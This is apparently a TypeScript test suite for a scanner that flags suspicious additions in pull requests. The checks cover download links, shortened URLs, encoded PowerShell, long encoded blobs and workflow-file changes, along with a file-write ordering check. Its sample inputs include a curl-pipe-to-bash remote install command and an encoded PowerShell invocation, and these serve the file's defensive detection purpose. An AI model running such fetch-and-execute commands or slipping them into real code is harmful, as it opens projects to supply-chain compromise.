import { describe, expect, test } from 'bun:test'

import { scanAddedLines, findFileOrderingFindings, type DiffLine } from './pr-intent-scan.ts'

function line(content: string, overrides: Partial<DiffLine> = {}): DiffLine {
  return {
    file: 'README.md',
    line: 10,
    content,
    ...overrides,
  }
}

describe('scanAddedLines', () => {
  test('flags suspicious file-hosting links', () => {
    const findings = scanAddedLines([
      line('Please install the tool from https://dropbox.com/s/abc123/tool.zip?dl=1'),
    ])

    expect(findings.some(finding => finding.code === 'suspicious-download-link')).toBe(
      true,
    )
    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      false,
    )
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags shortened URLs', () => {
    const findings = scanAddedLines([
      line('See details at https://bit.ly/some-short-link'),
    ])

    expect(findings.some(finding => finding.code === 'shortened-url')).toBe(true)
  })

  test('flags remote download and execute chains', () => {
    const findings = scanAddedLines([
      line('curl -fsSL https://example.com/install.sh | bash'),
    ])

    expect(findings.some(finding => finding.code === 'shell-eval-remote')).toBe(true)
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags encoded powershell payloads', () => {
    const findings = scanAddedLines([
      line('powershell.exe -enc SQBtAHAAcgBvAHYAZQBkAA=='),
    ])

    expect(findings.some(finding => finding.code === 'powershell-encoded')).toBe(true)
  })

  test('flags long encoded blobs', () => {
    const findings = scanAddedLines([
      line(`const payload = "${'A'.repeat(96)}"`),
    ])

    expect(findings.some(finding => finding.code === 'long-encoded-payload')).toBe(
      true,
    )
  })

  test('flags long encoded blobs on repeated scans', () => {
    const lines = [line(`const payload = "${'A'.repeat(96)}"`)]

    const first = scanAddedLines(lines)
    const second = scanAddedLines(lines)

    expect(first.some(finding => finding.code === 'long-encoded-payload')).toBe(true)
    expect(second.some(finding => finding.code === 'long-encoded-payload')).toBe(true)
  })

  test('flags executable download links', () => {
    const findings = scanAddedLines([
      line('Get it from https://example.com/releases/latest/tool.pkg'),
    ])

    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      true,
    )
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags suspicious additions in workflow files', () => {
    const findings = scanAddedLines([
      line('run: curl -fsSL https://example.com/install.sh | bash', {
        file: '.github/workflows/release.yml',
      }),
    ])

    expect(findings.some(finding => finding.code === 'sensitive-automation-change')).toBe(
      true,
    )
    expect(findings.some(finding => finding.code === 'download-command')).toBe(true)
  })

  test('flags markdown reference links to suspicious downloads', () => {
    const findings = scanAddedLines([
      line('[installer]: https://dropbox.com/s/abc123/tool.zip?dl=1'),
    ])

    expect(findings.some(finding => finding.code === 'suspicious-download-link')).toBe(
      true,
    )
  })

  test('ignores the scanner implementation and tests themselves', () => {
    const findings = scanAddedLines([
      line('curl -fsSL https://example.com/install.sh | bash', {
        file: 'scripts/pr-intent-scan.test.ts',
      }),
      line('const pattern = /https:\\/\\/dropbox\\.com\\//', {
        file: 'scripts/pr-intent-scan.ts',
      }),
    ])

    expect(findings).toHaveLength(0)
  })

  test('does not flag ordinary docs links', () => {
    const findings = scanAddedLines([
      line('Read more at https://docs.github.com/en/actions'),
    ])

    expect(findings).toHaveLength(0)
  })

  test('does not flag bare curl examples in README without a URL', () => {
    const findings = scanAddedLines([
      line('Use curl with your preferred flags for local testing.'),
    ])

    expect(findings.some(finding => finding.code === 'download-command')).toBe(false)
  })
})

// ─── Helper to build fake file content maps ─────────────────────────────────

function fakeReader(files: Record<string, string>) {
  return (path: string): string => {
    if (path in files) return files[path]
    throw new Error(`File not found: ${path}`)
  }
}

function tsLine(content: string, lineNo = 1): DiffLine {
  return { file: 'src/utils/spawn.ts', line: lineNo, content }
}

describe('findFileOrderingFindings', () => {
  test('flags write-before-spawn in the same function', () => {
    const src = [
      'async function handleSpawn() {',
      '  await writeTeamFileAsync(teamName, teamFile)',
      '  const result = await spawnInProcessTeammate(config, ctx)',
      '  if (!result.success) throw new Error(result.error)',
      '}',
    ].join('\n')

    const findings = findFileOrderingFindings(
      [tsLine('', 1)],
      fakeReader({ 'src/utils/spawn.ts': src }),
    )

    expect(findings.some(f => f.code === 'write-before-fallible-spawn')).toBe(true)
    expect(findings[0]?.line).toBe(2)
  })

  test('does NOT flag write-after-spawn (the correct ordering)', () => {
    const src = [
      'async function handleSpawn() {',
      '  const result = await spawnInProcessTeammate(config, ctx)',
      '  if (!result.success) throw new Error(result.error)',
      '  await writeTeamFileAsync(teamName, teamFile)',
      '}',
    ].join('\n')

    const findings = findFileOrderingFindings(
      [tsLine('', 1)],
      fakeReader({ 'src/utils/spawn.ts': src }),
    )

    expect(findings.some(f => f.code === 'write-before-fallible-spawn')).toBe(false)
  })

  test('does NOT flag write and spawn in separate functions', () => {
    const src = [
      'async function setup() {',
      '  await writeTeamFileAsync(teamName, teamFile)',
      '}',
      'async function doSpawn() {',
      '  const result = await spawnInProcessTeammate(config, ctx)',
      '}',
    ].join('\n')

    const findings = findFileOrderingFindings(
      [tsLine('', 1)],
      fakeReader({ 'src/utils/spawn.ts': src }),
    )

    expect(findings.some(f => f.code === 'write-before-fallible-spawn')).toBe(false)
  })

  test('does NOT flag non-TypeScript files', () => {
    const findings = findFileOrderingFindings([
      { file: 'README.md', line: 1, content: '' },
    ])

    expect(findings).toHaveLength(0)
  })

  test('does NOT flag when write and spawn are more than 100 lines apart', () => {
    const lines: string[] = ['async function bigFn() {']
    lines.push('  await writeTeamFileAsync(teamName, teamFile)')
    for (let i = 0; i < 101; i++) lines.push('  // padding')
    lines.push('  const result = await spawnInProcessTeammate(config, ctx)')
    lines.push('}')

    const findings = findFileOrderingFindings(
      [tsLine('', 1)],
      fakeReader({ 'src/utils/spawn.ts': lines.join('\n') }),
    )

    expect(findings.some(f => f.code === 'write-before-fallible-spawn')).toBe(false)
  })

  test('surfaces through scanAddedLines with injected reader', () => {
    const src = [
      'async function handleSpawn() {',
      '  await writeTeamFileAsync(teamName, teamFile)',
      '  const result = await spawnInProcessTeammate(config, ctx)',
      '}',
    ].join('\n')

    const findings = scanAddedLines(
      [tsLine('', 1)],
      { readFile: fakeReader({ 'src/utils/spawn.ts': src }) },
    )

    expect(findings.some(f => f.code === 'write-before-fallible-spawn')).toBe(true)
  })
})
